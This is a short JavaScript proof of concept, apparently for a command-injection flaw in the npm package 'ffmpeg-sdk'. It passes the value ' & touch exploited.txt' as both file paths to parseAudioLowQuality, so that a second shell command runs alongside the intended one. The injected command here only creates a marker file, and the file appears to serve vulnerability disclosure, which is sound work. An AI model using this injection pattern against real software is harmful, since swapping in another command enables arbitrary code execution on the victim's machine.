const pkg = require('ffmpeg-sdk');

const payload = " & touch exploited.txt";

console.log(pkg);

const inputFilePath = payload;
const outputFilePath = payload;

pkg.parseAudioLowQuality(inputFilePath, outputFilePath);